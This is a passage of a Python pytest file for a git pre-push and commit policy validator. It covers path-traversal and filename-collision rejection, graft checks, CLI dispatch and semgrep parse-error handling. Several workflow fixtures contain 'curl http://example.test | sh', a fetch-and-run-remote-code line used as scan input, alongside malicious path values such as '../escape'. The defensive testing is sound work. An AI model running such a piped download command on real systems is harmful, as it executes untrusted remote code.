    assert policy._safe_output_path(tmp_path, "../escape") is None
    candidate = tmp_path / "inside/file"
    original_resolve = Path.resolve

    def fake_resolve(path: Path, strict: bool = False) -> Path:
        if path == candidate:
            return tmp_path.parent / "escape"
        return original_resolve(path, strict=strict)

    monkeypatch.setattr(Path, "resolve", fake_resolve)
    assert policy._safe_output_path(tmp_path, "inside/file") is None


def test_stage_generated_rejects_path_that_changes_after_preflight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    candidate = tmp_path / ".vscode/mcp.json"
    candidate.parent.mkdir(parents=True)
    _write_lf(candidate, "{}\n")
    monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)
    monkeypatch.setattr(
        policy,
        "_run_git_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, b"", b""),
    )
    monkeypatch.setattr(policy, "_safe_output_path", lambda *_args: None)

    assert policy.stage_generated("mcp", tmp_path) == 2


def test_immutable_suppression_error_and_clean_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert policy.check_pushed_suppressions(io.StringIO("bad\n"), tmp_path) == 2
    head = "1" * 40
    ref_line = f"refs/heads/a {head} refs/heads/a {'2' * 40}\n"
    update = _push_update(head=head)
    monkeypatch.setattr(policy, "_push_updates", lambda *_args: [update])

    monkeypatch.setattr(policy, "_changed_commit_paths", lambda *_args: None)
    assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 2

    monkeypatch.setattr(
        policy,
        "_changed_commit_paths",
        lambda *_args: ["README.md", "source.py"],
    )
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="error"))
    assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 2

    def clean_suppression_git(_repo: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
        if args[0] == "diff" and "--name-status" in args:
            return _completed(0, "")
        return _completed(0, "clean\n")

    monkeypatch.setattr(policy, "_run_git", clean_suppression_git)
    assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 0


def test_commit_tree_read_errors_and_unsafe_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
    assert policy._commit_paths("head", tmp_path) is None
    assert policy._read_commit_blob("head", "file", tmp_path) is None

    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "../bad\0"))
    assert policy._commit_paths("head", tmp_path) is None


def test_immutable_semgrep_handles_input_materialization_and_empty_push(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    assert policy.scan_pushed_heads(io.StringIO("bad\n"), repo) == 2
    head = "1" * 40
    ref_line = f"refs/heads/a {head} refs/heads/a {'2' * 40}\n"
    monkeypatch.setattr(policy, "_materialize_commit_tree", lambda *_args: 2)
    assert policy.scan_pushed_heads(io.StringIO(ref_line), repo) == 2

    zero = "0" * 40
    deletion = f"(delete) {zero} refs/heads/a {'2' * 40}\n"
    assert policy.scan_pushed_heads(io.StringIO(deletion), repo) == 0


def test_materialize_commit_reads_raw_blob_and_rejects_bad_paths(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    head = _commit_file(repo, "nested/source.py", "raw content\n")
    destination = tmp_path / "tree"

    assert (
        policy._materialize_commit_tree(
            head,
            destination,
            repo,
            ["nested/source.py"],
        )
        == 0
    )
    assert (destination / "nested/source.py").read_text(encoding="utf-8") == ("raw content\n")
    assert policy._materialize_commit_tree(head, tmp_path / "unsafe", repo, ["../x.py"]) == 2
    assert policy._materialize_commit_tree(head, tmp_path / "missing", repo, ["x.py"]) == 2


@pytest.mark.parametrize(
    ("first", "second"),
    [
        ("PAYLOAD.py", "payload.py"),
        ("caf\u00e9.py", "cafe\u0301.py"),
        ("source.py", "source.py. "),
        ("PAYLOAD.py", "payload.py/source.js"),
        ("payload.py/source.js", "PAYLOAD.py"),
    ],
)
def test_materialize_commit_rejects_filesystem_path_collisions(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    first: str,
    second: str,
) -> None:
    monkeypatch.setattr(policy, "_commit_blob_id", lambda *_args: "abc")
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, b"content", b""),
    )

    assert (
        policy._materialize_commit_tree(
            "head",
            tmp_path / "tree",
            tmp_path,
            [first, second],
        )
        == 2
    )


@pytest.mark.parametrize(
    "path",
    [
        "CON.py",
        "COM\u00b9.py",
        "LPT\u00b3.txt",
        "source.py:payload",
        "source.py.",
        "source\u0001.py",
    ],
)
def test_materialize_commit_rejects_nonportable_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    path: str,
) -> None:
    monkeypatch.setattr(policy, "_commit_blob_id", lambda *_args: "abc")
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, b"content", b""),
    )

    assert (
        policy._materialize_commit_tree(
            "head",
            tmp_path / "tree",
            tmp_path,
            [path],
        )
        == 2
    )


def test_materialize_commit_never_overwrites_existing_output(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_commit_blob_id", lambda *_args: "abc")
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, b"new content", b""),
    )
    destination = tmp_path / "tree"

    assert (
        policy._materialize_commit_tree(
            "head",
            destination,
            tmp_path,
            ["source.py"],
        )
        == 0
    )
    assert (
        policy._materialize_commit_tree(
            "head",
            destination,
            tmp_path,
            ["source.py"],
        )
        == 2
    )
    assert (destination / "source.py").read_bytes() == b"new content"


@pytest.mark.parametrize(
    "tree_output",
    [
        b"",
        b"malformed\0",
        b"100644 blob abc\tother.py\0",
        b"120000 blob abc\tsource.py\0",
    ],
)
def test_commit_blob_id_rejects_invalid_tree_entries(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    tree_output: bytes,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, tree_output, b""),
    )

    assert policy._commit_blob_id("head", "source.py", tmp_path) is None


def test_commit_blob_id_propagates_git_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 1, b"", b"tree failed"),
    )

    assert policy._commit_blob_id("head", "source.py", tmp_path) is None


def test_materialize_commit_propagates_blob_read_and_write_failures(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_commit_blob_id", lambda *_args: "abc")
    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 1, b"", b"blob failed"),
    )
    assert (
        policy._materialize_commit_tree(
            "head",
            tmp_path / "read-failure",
            tmp_path,
            ["source.py"],
        )
        == 2
    )

    monkeypatch.setattr(
        policy,
        "_run_command_bytes",
        lambda *_args: subprocess.CompletedProcess([], 0, b"content", b""),
    )
    destination = tmp_path / "write-failure"
    _write_lf(destination, "not a directory\n")
    assert (
        policy._materialize_commit_tree(
            "head",
            destination,
            tmp_path,
            ["source.py"],
        )
        == 2
    )


def test_push_validation_rejects_active_grafts_in_linked_worktree(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    linked = tmp_path / "linked"
    _init_repo(repo)
    head = _commit_file(repo, "source.py", "value = 1\n")
    _git(repo, "worktree", "add", "-q", "-b", "feature/linked", str(linked))
    common_dir = Path(_git(linked, "rev-parse", "--git-common-dir").stdout.strip())
    if not common_dir.is_absolute():
        common_dir = (linked / common_dir).resolve()
    grafts = common_dir / "info/grafts"
    grafts.parent.mkdir(parents=True, exist_ok=True)
    grafts.write_bytes(b"")
    assert policy._check_no_grafts(linked) == 0

    _write_lf(grafts, "\n  # ignored comment\n")
    assert policy._check_no_grafts(linked) == 0

    _write_lf(grafts, f"{head} {'0' * 40}\n")
    stream = io.StringIO(
        f"refs/heads/feature/linked {head} refs/heads/feature/linked {'0' * 40}\n",
    )

    assert policy.check_push_refs(stream, linked) == 2
    assert policy.scan_pushed_heads(stream, linked) == 2


def test_graft_check_fails_closed_on_git_and_read_errors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
    assert policy._check_no_grafts(tmp_path) == 2

    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "\n"))
    assert policy._check_no_grafts(tmp_path) == 2

    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, "unknown option\n.git/info/grafts\n"),
    )
    assert policy._check_no_grafts(tmp_path) == 2

    relative_common_dir = tmp_path / "relative.git"
    (relative_common_dir / "info").mkdir(parents=True)
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, "relative.git/info/grafts\n"),
    )
    assert policy._check_no_grafts(tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, f"{tmp_path}\n"),
    )

    def fail_read(_path: Path) -> bytes:
        raise PermissionError("denied")

    monkeypatch.setattr(Path, "read_bytes", fail_read)
    assert policy._check_no_grafts(tmp_path) == 2


@pytest.mark.parametrize(
    ("result", "expected"),
    [
        (_completed(1), 2),
        (_completed(0, "unknown\n"), 2),
        (_completed(0, "true\n"), 2),
        (_completed(0, "false\n"), 0),
    ],
)
def test_history_integrity_rejects_shallow_or_unknown_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    result: subprocess.CompletedProcess[str],
    expected: int,
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: result)
    monkeypatch.setattr(policy, "_check_no_grafts", lambda _root: 0)

    assert policy._check_history_integrity(tmp_path) == expected


def test_push_update_defense_blocks_protected_destination(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    ref = policy.PushRef("refs/heads/a", "1" * 40, "refs/heads/main", "2" * 40)
    update = policy.PushUpdate(ref, "base", ref.local_sha, "base..head", "main")
    monkeypatch.setattr(policy, "_check_commit_limit", lambda *_args: 0)
    monkeypatch.setattr(policy, "_check_review_marker", lambda *_args: 0)
    monkeypatch.setattr(policy, "_check_plugin_version", lambda *_args: 0)

    assert policy._check_push_updates([update], tmp_path) == 1


def test_recent_bot_review_emits_warning(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    recent = datetime.now(UTC).isoformat()
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0, recent))

    policy._warn_recent_bot_review("9", tmp_path)

    assert "last bot review" in capsys.readouterr().out


def test_remaining_policy_success_and_error_branches(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    absolute_merge_head = tmp_path / "MERGE_HEAD"
    _write_lf(absolute_merge_head, "head\n")
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, f"{absolute_merge_head}\n"),
    )
    assert policy._merge_in_progress(tmp_path)

    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))

    update = policy.PushUpdate(
        policy.PushRef("refs/tags/local", "1" * 40, "refs/tags/remote", "2" * 40),
        "base",
        "head",
        "base..head",
        None,
    )
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
    assert policy._check_commit_limit(update, tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, "/review@security on deadbeef\n"),
    )
    assert policy._check_review_marker(update, tmp_path) == 0

    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))
    assert policy.run_yamllint(["config.yml"], tmp_path) == 0
    assert policy.run_planning_advisory(tmp_path) == 0
    assert policy.run_taste_advisory(["source.py"], tmp_path) == 0
    monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)
    assert policy.generate_mcp_advisory(tmp_path) == 0
    assert policy.generate_agents_advisory(tmp_path) == 0
    assert policy.update_memory_tokens(tmp_path) == 0
    assert policy.sync_observations(["observations.md"], tmp_path) == 0

    ref = policy.PushRef("refs/heads/a", "1" * 40, "refs/heads/a", "2" * 40)
    monkeypatch.setattr(policy, "parse_push_refs", lambda _stream: [ref])
    monkeypatch.setattr(policy, "resolve_push_update", lambda *_args: update)
    assert policy.check_placeholder_identities(io.StringIO(), tmp_path) == 0

    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "10\t0\tfile\n"))
    assert policy.additions_advisory(tmp_path) == 0
    assert "recommended maximum" not in capsys.readouterr().out


def test_changed_commit_path_and_scan_edge_cases(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    real_commit_paths = policy._commit_paths
    real_scan_pushed_head = policy._scan_pushed_head

    range_update = _push_update()
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
    assert policy._changed_commit_paths(range_update, tmp_path) is None
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, r"bad\path.py" + "\0"),
    )
    assert policy._changed_commit_paths(range_update, tmp_path) is None
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, "source.py\0\0"),
    )
    assert policy._changed_commit_paths(range_update, tmp_path) == ["source.py"]
    monkeypatch.setattr(policy, "_commit_paths", real_commit_paths)
    assert policy._commit_paths("head", tmp_path) == ["source.py"]

    monkeypatch.setattr(policy, "_push_updates", lambda *_args: [range_update])
    monkeypatch.setattr(
        policy,
        "_changed_commit_paths",
        lambda *_args: ["README.md"],
    )
    assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_changed_commit_paths",
        lambda *_args: ["source.py"],
    )
    monkeypatch.setattr(policy, "_scan_pushed_head", lambda *_args: 2)
    assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 2
    monkeypatch.setattr(policy, "_materialize_commit_tree", lambda *_args: 2)
    assert real_scan_pushed_head("head", ["source.py"], tmp_path) == 2

    second_update = _push_update(head="head-two", range_spec="base..head-two")
    monkeypatch.setattr(
        policy,
        "_push_updates",
        lambda *_args: [range_update, second_update],
    )
    monkeypatch.setattr(
        policy,
        "_changed_commit_paths",
        lambda *_args: ["source.py"],
    )
    monkeypatch.setattr(policy, "_scan_pushed_head", lambda *_args: 0)
    assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 0


def test_memory_size_validation_error_and_success_branches(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    real_staged_memory_paths = policy._staged_memory_paths
    assert policy.validate_memory_sizes(tmp_path) == 2

    validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
    validator.parent.mkdir(parents=True)
    _write_lf(validator, "pass\n")
    monkeypatch.setattr(policy, "_staged_memory_paths", lambda *_args: None)
    assert policy.validate_memory_sizes(tmp_path) == 2
    monkeypatch.setattr(policy, "_staged_memory_paths", real_staged_memory_paths)

    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
    assert policy._staged_memory_paths(tmp_path, "A") is None
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, r"bad\memory.md" + "\0"),
    )
    assert policy._staged_memory_paths(tmp_path, "A") is None
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, ".serena/memories/good.md\0\0"),
    )
    assert policy._staged_memory_paths(tmp_path, "A") == [".serena/memories/good.md"]

    good = tmp_path / ".serena/memories/good.md"
    good.parent.mkdir(parents=True)
    _write_lf(good, "good\n")
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))
    assert not policy._validate_memory_path_set(
        [".serena/memories/good.md"],
        validator,
        tmp_path,
        blocking=True,
    )
    assert policy._validate_memory_path_set(
        [".serena/memories/missing.md"],
        validator,
        tmp_path,
        blocking=True,
    )


@pytest.mark.parametrize(
    ("payload", "expected_warning"),
    [
        ('{"fetched_pages_complete": false, "unresolved_count": 2}', False),
        ('{"fetched_pages_complete": true, "unresolved_count": true}', False),
        ('{"fetched_pages_complete": true, "unresolved_count": 0}', False),
    ],
)
def test_unresolved_thread_non_warning_cases(
    payload: str,
    expected_warning: bool,
    capsys: pytest.CaptureFixture[str],
) -> None:
    policy._warn_unresolved_threads(payload, "10")

    assert ("unresolved thread" in capsys.readouterr().out) is expected_warning


def test_old_bot_review_does_not_warn(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    old = datetime(2020, 1, 1, tzinfo=UTC).isoformat()
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0, old))

    policy._warn_recent_bot_review("10", tmp_path)

    assert "last bot review" not in capsys.readouterr().out


@pytest.mark.parametrize(
    ("command", "arguments", "target"),
    [
        ("branch", [], "check_branch"),
        ("handoff", ["README.md"], "check_handoff"),
        ("session", ["session.json"], "check_sessions"),
        ("staged-dashes", ["doc.md"], "check_staged_dashes"),
        ("staged-action-pins", ["action.yml"], "check_staged_action_pins"),
        ("github-bash", [".github/scripts/check.py"], "check_github_bash_scripts"),
        ("security-suppressions", ["source.py"], "check_security_suppressions"),
        ("mypy", ["source.py"], "run_mypy"),
        ("yamllint", ["config.yml"], "run_yamllint"),
        ("skillforge", ["SKILL.md"], "run_skillforge"),
        ("taste", ["source.py"], "run_taste_advisory"),
        ("memory-cross-reference", ["memory.md"], "cross_reference_memories"),
        ("workflow-local", ["workflow.yml"], "run_workflow_local"),
        ("sessions", ["session.json"], "validate_branch_sessions"),
        ("observations", ["observations.md"], "sync_observations"),
        ("stage-generated", ["mcp"], "stage_generated"),
        ("extract-episodes", ["session.json"], "extract_session_episodes"),
        ("planning", [], "run_planning_advisory"),
        ("adr-review", ["README.md"], "check_adr_review_policy"),
        ("retrospective", ["README.md"], "check_retrospective_evidence"),
        ("generate-mcp", [], "generate_mcp_advisory"),
        ("generate-agents", [], "generate_agents_advisory"),
        ("memory-token-update", [], "update_memory_tokens"),
        ("memory-size", [], "validate_memory_sizes"),
        ("memory-sync", [], "run_memory_sync"),
        ("pytest", [], "run_pytest"),
        ("placeholder-identity", [], "check_placeholder_identities"),
        ("additions", [], "additions_advisory"),
        ("cli-hook-e2e", [], "run_cli_e2e"),
        ("cli-plugin-e2e", [], "run_cli_e2e"),
        ("bot-cascade", [], "bot_cascade_advisory"),
        ("semgrep", [], "run_semgrep"),
        ("semgrep-push", [], "scan_pushed_heads"),
        ("security-suppressions-push", [], "check_pushed_suppressions"),
    ],
)
def test_cli_dispatches_independent_subcommands(
    command: str,
    arguments: list[str],
    target: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, target, lambda *_args: 0)

    assert policy.main(["--repo-root", str(tmp_path), command, *arguments]) == 0


def test_cli_dispatches_commit_message_and_pre_push(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "check_commit_message", lambda *_args: 0)
    assert policy.main(["commit-message", str(tmp_path / "message")]) == 0

    monkeypatch.setattr(policy, "check_push_refs", lambda *_args: 0)
    assert policy.main(["--repo-root", str(tmp_path), "pre-push"]) == 0


def test_git_probe_error_paths_return_no_result(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))

    assert not policy._merge_in_progress(tmp_path)


def test_module_entrypoint_returns_cli_exit_code(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = PROJECT_ROOT / "scripts/validation/git_hook_policy.py"
    monkeypatch.setattr(
        sys,
        "argv",
        [str(script), "--repo-root", str(tmp_path), "branch"],
    )

    with pytest.raises(SystemExit) as error:
        runpy.run_path(str(script), run_name="__main__")
    assert error.value.code == 2


# --- workflow-local merge-base scoping (issue #2993) ---


def _workflow_repo_with_base(tmp_path: Path) -> tuple[Path, str]:
    """Repo with an imported workflow on main; returns (repo, base_sha).

    The caller checks out a feature branch and adds its own changes; the base
    SHA marks the merge base so ``base...HEAD`` isolates the branch delta.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    _commit_file(repo, ".github/workflows/imported.yml", "name: imported\n")
    base = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _git(repo, "checkout", "-q", "-b", "feature/test")
    return repo, base


def test_pushed_workflow_paths_selects_only_branch_delta(tmp_path: Path) -> None:
    repo, base = _workflow_repo_with_base(tmp_path)
    _commit_file(repo, ".github/workflows/mine.yml", "name: mine\n")

    changed = policy._pushed_workflow_paths(
        [".github/workflows/imported.yml", ".github/workflows/mine.yml"],
        repo,
        base,
    )

    assert changed == {".github/workflows/mine.yml"}


def test_pushed_workflow_paths_returns_none_when_base_unresolved(
    tmp_path: Path,
) -> None:
    repo, _ = _workflow_repo_with_base(tmp_path)

    assert (
        policy._pushed_workflow_paths([".github/workflows/imported.yml"], repo, "origin/main")
        is None
    )


def test_pushed_workflow_paths_empty_input_returns_empty(tmp_path: Path) -> None:
    repo, base = _workflow_repo_with_base(tmp_path)

    assert policy._pushed_workflow_paths([], repo, base) == set()


def _stub_act_run(
    monkeypatch: pytest.MonkeyPatch,
    sink: dict[str, object],
) -> None:
    """Run git for real; intercept only the act runner invocation.

    run_workflow_local reaches _run_command twice: once for the merge-base
    ``git diff`` and once for the workflow runner. Patching the low-level
    helper naively would break the diff, so this dispatcher forwards git calls
    to the real implementation and captures or stubs the runner call.
    """
    real_run = policy._run_command

    def _fake_run(
        cmd: Sequence[str],
        repo_root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        if any("run_workflow_local_test.py" in str(part) for part in cmd):
            sink["act_cmd"] = list(cmd)
            return _completed(0, "")
        return real_run(cmd, repo_root)

    monkeypatch.setattr(policy, "_run_command", _fake_run)
    monkeypatch.setattr(policy, "_print_process_output", lambda *_a: None)


def test_run_workflow_local_skips_imported_only_push(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    repo, base = _workflow_repo_with_base(tmp_path)
    _commit_file(repo, "src/mod.py", "x = 1\n")  # non-workflow branch change
    monkeypatch.setenv(policy.WORKFLOW_LOCAL_BASE_REF_ENV, base)
    sink: dict[str, object] = {}
    _stub_act_run(monkeypatch, sink)

    assert policy.run_workflow_local([".github/workflows/imported.yml"], repo) == 0
    assert "act_cmd" not in sink
    assert "skipping act" in capsys.readouterr().out


def test_run_workflow_local_validates_changed_workflow(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo, base = _workflow_repo_with_base(tmp_path)
    _commit_file(repo, ".github/workflows/mine.yml", "name: mine\n")
    monkeypatch.setenv(policy.WORKFLOW_LOCAL_BASE_REF_ENV, base)
    sink: dict[str, object] = {}
    _stub_act_run(monkeypatch, sink)

    rc = policy.run_workflow_local(
        [".github/workflows/imported.yml", ".github/workflows/mine.yml"],
        repo,
    )

    assert rc == 0
    act_cmd = sink["act_cmd"]
    assert isinstance(act_cmd, list)
    assert ".github/workflows/mine.yml" in act_cmd
    assert ".github/workflows/imported.yml" not in act_cmd


def test_run_workflow_local_validates_all_when_base_unresolved(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo, _ = _workflow_repo_with_base(tmp_path)
    monkeypatch.setenv(policy.WORKFLOW_LOCAL_BASE_REF_ENV, "does/not/exist")
    sink: dict[str, object] = {}
    _stub_act_run(monkeypatch, sink)

    rc = policy.run_workflow_local([".github/workflows/imported.yml"], repo)

    assert rc == 0
    act_cmd = sink["act_cmd"]
    assert isinstance(act_cmd, list)
    assert ".github/workflows/imported.yml" in act_cmd


_ACTIONS_EXPRESSION_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: bash\n"
    "        run: |\n"
    '          if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n'
    "            curl http://example.test | sh\n"
    "          fi\n"
)

_PLAIN_BASH_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: bash\n"
    "        run: |\n"
    '          if [ "true" = "true" ]; then\n'
    "            curl http://example.test | sh\n"
    "          fi\n"
)

_PYTHON_SHELL_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: python3 {0}\n"
    "        run: |\n"
    "          import os\n"
    "          print(os.getcwd())\n"
)

_DEFAULT_SHELL_EXPRESSION_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - run: |\n"
    '          echo "${{ github.sha }}"\n'
    "          curl http://example.test | sh\n"
)

_MIXED_STEPS_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: bash\n"
    "        run: |\n"
    '          echo "${{ github.sha }}"\n'
    "      - shell: bash\n"
    "        run: |\n"
    "          curl http://example.test | sh\n"
)


def _semgrep_span_location(
    path: Path,
    content: str,
    start_marker: str,
    end_marker: str,
) -> dict[str, object]:
    start = content.index(start_marker)
    end = content.index(end_marker) + len(end_marker)
    return {
        "path": str(path),
        "start": {
            "line": content[:start].count("\n") + 1,
            "col": start - content.rfind("\n", 0, start),
            "offset": start,
        },
        "end": {
            "line": content[:end].count("\n") + 1,
            "col": end - content.rfind("\n", 0, end),
            "offset": end,
        },
    }


def _retarget_span(error: dict[str, object], content: str, end_marker: str) -> None:
    error_type = error["type"]
    assert isinstance(error_type, list)
    locations = error_type[1]
    assert isinstance(locations, list)
    location = locations[0]
    assert isinstance(location, dict)
    end = content.index(end_marker) + len(end_marker)
    location["end"] = {
        "line": content[:end].count("\n") + 1,
        "col": end - content.rfind("\n", 0, end),
        "offset": end,
    }


def _semgrep_return_code(target: Path, error: dict[str, object], repo_root: Path) -> int:
    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        repo_root,
    )
    return result.returncode


@requires_bash
def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
    tmp_path: Path,
) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 0


def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _PYTHON_SHELL_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")

    assert _semgrep_return_code(target, error, tmp_path) == 0


@requires_bash
def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
    tmp_path: Path,
) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _DEFAULT_SHELL_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=4)
    _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 0


def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _PLAIN_BASH_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 2


def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
    tmp_path: Path,
) -> None:
    target = tmp_path / "workflow.yml"
    content = _MIXED_STEPS_WORKFLOW
    _write_lf(target, content)
    error = _powershell_partial_parsing_error(target, line=5)
    error_type = error["type"]
    assert isinstance(error_type, list)
    error["type"] = [
        error_type[0],
        [
            _semgrep_span_location(target, content, 'echo "${{', 'github.sha }}"'),
            _semgrep_span_location(target, content, "curl http", "example.test | sh"),
        ],
    ]

    assert _semgrep_return_code(target, error, tmp_path) == 2


def test_semgrep_blocks_expression_step_error_reported_at_error_level(
    tmp_path: Path,
) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
    error["level"] = "error"

    assert _semgrep_return_code(target, error, tmp_path) == 2


def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
    target = tmp_path / "workflow.yml"
    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(
        target,
        line=5,
        rule_id="python.lang.security.audit.eval-detected",
    )
    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 2


@requires_bash
def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
    tmp_path: Path,
) -> None:
    target = tmp_path / "workflow.yml"
    content = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - shell: bash\n"
        "        run: |\n"
        '          echo "${{ github.sha }}"\n'
    )
    _write_lf(target, content)
    error = _powershell_semgrep_error(
        target,
